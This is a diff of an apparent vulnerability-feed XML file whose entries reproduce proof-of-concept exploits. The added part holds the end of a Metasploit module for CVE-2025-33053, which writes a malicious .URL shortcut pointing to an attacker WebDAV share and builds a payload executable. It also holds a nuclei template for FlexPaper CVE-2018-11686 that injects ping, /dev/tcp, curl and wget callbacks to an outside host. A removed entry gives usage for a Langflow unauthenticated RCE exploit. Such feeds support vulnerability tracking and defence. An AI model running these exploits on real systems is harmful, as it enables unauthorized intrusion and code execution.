class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">write_url_file</span><br>    unc_path = <span class="hljs-string">&quot;\\\\<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;LHOST&#x27;</span>]&#125;</span>\\<span class="hljs-subst">#&#123;<span class="hljs-title class_">File</span>.basename(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>])&#125;</span>\\&quot;</span><br>    content = <span class="hljs-string">&lt;&lt;~URLFILE</span><br><span class="hljs-string">      [InternetShortcut]</span><br><span class="hljs-string">      URL=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;LOLBAS_EXE&#x27;</span>]&#125;</span></span><br><span class="hljs-string">      WorkingDirectory=<span class="hljs-subst">#&#123;unc_path&#125;</span></span><br><span class="hljs-string">      ShowCommand=7</span><br><span class="hljs-string">      IconIndex=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;ICON_INDEX&#x27;</span>]&#125;</span></span><br><span class="hljs-string">      IconFile=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;ICON_PATH&#x27;</span>]&#125;</span></span><br><span class="hljs-string">      Modified=<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;MODIFIED_HEX&#x27;</span>]&#125;</span></span><br><span class="hljs-string">    URLFILE</span><br>    <span class="hljs-title class_">File</span>.write(datastore[<span class="hljs-string">&#x27;OUTFILE&#x27;</span>], content)<br>    print_good(<span class="hljs-string">&quot;.URL file written to: <span class="hljs-subst">#&#123;url_file&#125;</span>&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_payload_exe</span>(<span class="hljs-params">payload_name, lhost, lport, output_path</span>)<br>    payload = framework.payloads.create(payload_name.to_s.strip)<br>    payload.datastore[<span class="hljs-string">&#x27;LHOST&#x27;</span>] = lhost<br>    payload.datastore[<span class="hljs-string">&#x27;LPORT&#x27;</span>] = lport<br>    raw = payload.generate<br>    exe = <span class="hljs-title class_">Msf</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Util</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EXE</span>.to_win32pe(framework, raw)<br>    <span class="hljs-title class_">File</span>.open(output_path, <span class="hljs-string">&#x27;wb&#x27;</span>) &#123; |<span class="hljs-params">f</span>| f.write(exe) &#125;<br>    print_good(<span class="hljs-string">&quot;Payload successfully written to <span class="hljs-subst">#&#123;output_path&#125;</span>&quot;</span>)<br>  <span class="hljs-keyword">rescue</span> <span class="hljs-title class_">StandardError</span> =&gt; e<br>    print_error(<span class="hljs-string">&quot;Failed to generate payload: <span class="hljs-subst">#&#123;e.<span class="hljs-keyword">class</span>&#125;</span> <span class="hljs-subst">#&#123;e.message&#125;</span>&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-33053 Exploit via Malicious .U</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>FlexPaper 远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/17/github_2539206966/"/>
+    <id>http://example.com/2025/06/17/github_2539206966/</id>
+    <published>2025-06-17T15:45:15.460Z</published>
+    <updated>2025-06-17T15:45:15.457Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> FlexPaper 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11686</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> FlexPaper (FlowPaper) 2.3.6版本中的setup.php和change_config.php存在不安全处理，允许远程攻击者执行任意代码，成功利用此漏洞可能导致未授权访问、数据泄露以及目标系统的潜在危害。</p><p><strong>产品厂商：</strong> flowpaper</p><p><strong>产品名称：</strong> FlexPaper</p><p><strong>影响版本：</strong> version &lt;&#x3D; 2.3.6</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/932f223de1837eb1abf2719b28cca509d97ad870/http%2Fcves%2F2018%2FCVE-2018-11686.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/932f223de1837eb1abf2719b28cca509d97ad870/http%2Fcves%2F2018%2FCVE-2018-11686.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">11686</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> FlexPaper <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> mpgn, pszyszkowski<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    FlexPaper (FlowPaper) <span class="hljs-number">2.3</span>.<span class="hljs-number">6</span> contains a remote code execution caused by insecure handling <span class="hljs-keyword">in</span> setup.php and change_config.php, letting remote attackers execute arbitrary code, exploit requires access to these scripts.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation of this vulnerability can lead to unauthorized access, data leakage, and potential compromise of the target system.<br>  <span class="hljs-params">remediation:</span> |<br>    Update to version <span class="hljs-operator">&gt;</span> <span class="hljs-number">2.3</span>.<span class="hljs-number">6</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.exploit-db.com<span class="hljs-operator">/</span>docs<span class="hljs-operator">/</span>english<span class="hljs-operator">/</span><span class="hljs-number">4652</span>1-flexpaper-<span class="hljs-operator">=</span><span class="hljs-operator">-</span><span class="hljs-number">2.3</span>.<span class="hljs-number">6</span><span class="hljs-operator">-</span>remote-code-execution-whitepaper.pdf<br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//vulncheck.com/xdb/b67f601a7711</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/mpgn/CVE-2018-11686</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">11686</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">20</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:flowpaper:flexpaper:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> flowpaper<br>    <span class="hljs-params">product:</span> flexpaper<br>  <span class="hljs-params">tags:</span> cve2018,cve,flexpaper,shell,rce,auth-bypass,intrusive<br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">callback:</span> <span class="hljs-string">&quot;ping%20-c1%20%7b%7binteractsh-url%7d%7d%20%7c%7c%20nslookup%20%7b%7binteractsh-url%7d%7d%20%7c%7c%20echo%201%20%3e%2fdev%2ftcp%2f%7b%7binteractsh-url%7d%7d%2f80%20%7c%7c%20curl%20http%3a%2f%2f%7b%7binteractsh-url%7d%7d%20-o%20%2fdev%2fnull%20%7c%7c%20wget%20http%3a%2f%2f%7b%7binteractsh-url%7d%7d%20-O%20%2fdev%2fnull%3b&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/php/setup.php?step=4&amp;PDF2SWF_PATH=&#123;&#123;callback&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">stop-at-first-match:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> interactsh_protocol<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;dns&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> interactsh_protocol<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;http&quot;</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; FlexPaper 远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
   
   <entry>
     <title>Kubernetes Pod Create 权限漏洞</title>
@@ -411,137 +544,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>基于Rust红队快速资产清点工具-espscan - v310</title>
-    <link href="http://example.com/2025/06/17/weixin_661594889/"/>
-    <id>http://example.com/2025/06/17/weixin_661594889/</id>
-    <published>2025-06-17T11:12:27.026Z</published>
-    <updated>2025-06-17T11:12:27.021Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/4AR5xLfo1kg0ftaeY8j8Sg">https://mp.weixin.qq.com/s/4AR5xLfo1kg0ftaeY8j8Sg</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/4AR5xLfo1kg0ftaeY8j8Sg&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>OpenAI获五角大楼2亿美元合同，AI可能间接支持军事行动</title>
-    <link href="http://example.com/2025/06/17/weixin_1038868093/"/>
-    <id>http://example.com/2025/06/17/weixin_1038868093/</id>
-    <published>2025-06-17T11:12:25.512Z</published>
-    <updated>2025-06-17T11:12:25.509Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/ayfQjwC19oODtCIUVILpag">https://mp.weixin.qq.com/s/ayfQjwC19oODtCIUVILpag</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/ayfQjwC19oODtCIUVILpag&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Is b For Backdoor? Pre-Auth RCE Chain In Sitecore Experience Platform</title>
-    <link href="http://example.com/2025/06/17/blog_2658481578/"/>
-    <id>http://example.com/2025/06/17/blog_2658481578/</id>
-    <published>2025-06-17T10:30:06.386Z</published>
-    <updated>2025-06-17T10:30:06.382Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>描述：</strong> Welcome to June! We’re back—this time, we’re exploring Sitecore’s Experience Platform (XP), demonstrating a pre-auth RCE chain that we reported to Sitecore in February 2025.</p><p>We’ve spent a bit of time recently looking at CMS’s given the basic fact that they represent attractive</p><p><strong>链接：</strong> <a href="https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/">https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;描述：&lt;/strong&gt; Welcome to June! We’re back—this time, we’re exploring Sitecore’s Experience Platform (XP), demonstrating a pre-auth</summary>
-      
-    
-    
-    
-    <category term="安全博客" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%8D%9A%E5%AE%A2/"/>
-    
-    
-    <category term="labs.watchtowr.com" scheme="http://example.com/tags/labs-watchtowr-com/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【已复现】泛微 E-cology SQL注入漏洞</title>
-    <link href="http://example.com/2025/06/17/weixin_4109101719/"/>
-    <id>http://example.com/2025/06/17/weixin_4109101719/</id>
-    <published>2025-06-17T10:15:54.706Z</published>
-    <updated>2025-06-17T10:15:54.702Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 长亭安全应急响应中心</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/wlnouIOuFDRgFX1A8s7Wtg">https://mp.weixin.qq.com/s/wlnouIOuFDRgFX1A8s7Wtg</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 长亭安全应急响应中心&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/wlnouIOuFDRgFX1A8s7Wtg&quot;&gt;https://mp.weixi</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="长亭安全应急响应中心" scheme="http://example.com/tags/%E9%95%BF%E4%BA%AD%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Langflow Remote Code Execution Vulnerability</title>
-    <link href="http://example.com/2025/06/17/github_3370667342/"/>
-    <id>http://example.com/2025/06/17/github_3370667342/</id>
-    <published>2025-06-17T09:45:14.802Z</published>
-    <updated>2025-06-17T09:45:14.799Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Langflow Remote Code Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-3248</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Langflow 应用存在远程代码执行漏洞（CVE-2025-3248），攻击者可通过未授权访问 <code>/api/v1/validate/code</code> 端点，利用动态 <code>exec()</code> 函数在用户控制的代码路径中执行任意命令。</p><p><strong>产品名称：</strong> Langflow</p><p><strong>搜索语法：</strong> app&#x3D;”Langflow”</p><p><strong>来源：</strong> <a href="https://github.com/ynsmroztas/CVE-2025-3248-Langflow-RCE">https://github.com/ynsmroztas/CVE-2025-3248-Langflow-RCE</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>langflow_rce_unauth.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="mitsec-CVE-2025-3248-Langflow-RCE-Exploit"><a href="#mitsec-CVE-2025-3248-Langflow-RCE-Exploit" class="headerlink" title="mitsec - CVE-2025-3248 Langflow RCE Exploit"></a>mitsec - CVE-2025-3248 Langflow RCE Exploit</h2><p>Remote Code Execution (RCE) exploit for <strong>Langflow</strong> applications vulnerable to <strong>CVE-2025-3248</strong>.</p><blockquote><p>Affected Endpoint: <code>/api/v1/validate/code</code></p></blockquote><h3 id="🚀-Exploit-Features"><a href="#🚀-Exploit-Features" class="headerlink" title="🚀 Exploit Features"></a>🚀 Exploit Features</h3><ul><li>Remote and unauthenticated RCE</li><li>No authentication required</li><li>Python3 one-liner script</li><li>Colorized terminal output</li></ul><h3 id="🔧-Usage"><a href="#🔧-Usage" class="headerlink" title="🔧 Usage"></a>🔧 Usage</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 mitsec.py -u http://target:7860 -c <span class="hljs-string">&quot;id&quot;</span><br></code></pre></td></tr></table></figure><h3 id="🧪-Example-Output"><a href="#🧪-Example-Output" class="headerlink" title="🧪 Example Output"></a>🧪 Example Output</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] Command Output:<br>uid=1001(langflow) gid=1001(langflow) <span class="hljs-built_in">groups</span>=1001(langflow)<br></code></pre></td></tr></table></figure><h3 id="🧠-CVE-Details"><a href="#🧠-CVE-Details" class="headerlink" title="🧠 CVE Details"></a>🧠 CVE Details</h3><ul><li><strong>CVE</strong>: CVE-2025-3248</li><li><strong>Type</strong>: Remote Code Execution (RCE)</li><li><strong>Component</strong>: Langflow backend</li><li><strong>Condition</strong>: Misuse of dynamic <code>exec()</code> in user-controlled code path</li></ul><h3 id="📌-ZoomEye-Dork"><a href="#📌-ZoomEye-Dork" class="headerlink" title="📌 ZoomEye Dork"></a>📌 ZoomEye Dork</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">app</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Langflow&quot;</span><br></code></pre></td></tr></table></figure><h3 id="🧑‍💻-Author"><a href="#🧑‍💻-Author" class="headerlink" title="🧑‍💻 Author"></a>🧑‍💻 Author</h3><ul><li>Twitter: <a href="https://twitter.com/ynsmroztas">@ynsmroztas</a></li><li>GitHub: <a href="https://github.com/ynsmroztas">@ynsmroztas</a></li></ul><h3 id="📜-Disclaimer"><a href="#📜-Disclaimer" class="headerlink" title="📜 Disclaimer"></a>📜 Disclaimer</h3><blockquote><p>This tool is for <strong>educational and authorized security testing</strong> purposes only. Unauthorized use is prohibited.</p></blockquote>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Langflow Remote Code Execution Vulnerab</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
   </entry>
   
